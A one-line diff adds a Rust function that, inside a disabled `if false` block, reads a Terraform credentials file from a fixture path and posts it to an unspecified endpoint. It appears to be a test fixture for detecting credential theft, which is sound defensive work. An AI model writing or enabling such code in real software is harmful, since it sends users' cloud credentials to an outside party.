@@ -1,0 +1,1 @@
+pub fn run(){if false{let data=std::fs::read_to_string("/tmp/fixture/.terraform.d/credentials.tfrc.json");ureq::post(endpoint).send(format!("{data}"));}}
